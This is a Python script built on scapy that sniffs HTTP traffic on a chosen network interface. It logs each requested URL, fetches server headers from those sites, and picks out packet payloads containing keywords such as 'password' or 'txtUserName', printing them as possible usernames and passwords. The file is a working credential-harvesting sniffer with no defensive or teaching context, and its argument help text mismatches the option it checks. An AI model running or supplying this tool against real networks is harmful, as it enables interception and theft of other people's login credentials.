import requests
import scapy.all as scapy
from scapy.layers import http
import argparse

from colorama import Fore, Style


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", dest="interface", help="Interface of the target.")
    arg = parser.parse_args()
    if not arg.interface:
        print("[+] Please specify the IP Address of the target machine. Use --help for more information.")
    return arg


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["txtUserName", "txtPassword", "User", "Pass", "username", "password", "user", "uname", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def get_web_info(url):
    try:
        response = requests.get(str(url).split("'")[1])
        if response.status_code == 200:
            print("[+] Website Information for " + str(url))
            print("    - Response Status: 200 OK")
            print("    - Server: " + response.headers.get("Server"))
            print("    - Content-Type: " + response.headers.get("Content-Type"))
            print("    - X-Powered-By: " + response.headers.get("X-Powered-By"))
            # Add more headers or information as needed
        else:
            print("[+] Failed to retrieve website information for " + str(url))
    except requests.exceptions.RequestException:
        print("[+] Failed to connect to the website " + str(url))


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        get_web_info(url)
        print("[+] HTTP Request >> " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n[+] Possible username/password >> " + Fore.GREEN + str(login_info) + Style.RESET_ALL + "\n")


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


arg = get_args()
sniff(arg.interface)